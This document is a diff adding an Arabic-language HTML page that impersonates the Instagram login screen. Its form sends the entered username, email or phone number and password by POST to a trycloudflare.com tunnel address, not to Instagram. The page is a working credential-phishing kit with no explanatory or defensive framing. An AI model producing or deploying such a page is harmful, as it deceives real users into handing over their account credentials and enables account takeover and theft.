@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .box {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 8px;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            text-align: center;
+        }
+        .box h1 {
+            font-family: "Billabong", cursive;
+            font-size: 50px;
+            font-weight: normal;
+            margin-bottom: 30px;
+            color: #262626;
+        }
+        .box input {
+            width: 100%;
+            padding: 12px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 14px;
+            background: #fafafa;
+        }
+        .box input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        .box button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .box button:hover {
+            background: #1877f2;
+        }
+        .box .footer {
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+        .box .footer a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .box .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .box .divider::before,
+        .box .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .box .divider::before { margin-right: 15px; }
+        .box .divider::after { margin-left: 15px; }
+        .box .facebook-login {
+            color: #385185;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            display: block;
+            margin: 10px 0;
+        }
+        .box .signup {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .box .signup a {
+            color: #0095f6;
+            font-weight: bold;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>Instagram</h1>
+        <form action="https://hood-charge-solutions-diploma.trycloudflare.com" method="POST">
+            <input type="text" name="email" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" name="pass" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <div class="divider">أو</div>
+        <span class="facebook-login">تسجيل الدخول عبر فيسبوك</span>
+        <div class="footer"><a href="#">هل نسيت كلمة المرور؟</a></div>
+        <div class="signup">ليس لديك حساب؟ <a href="#">سجل الآن</a></div>
+    </div>
+</body>
+</html>
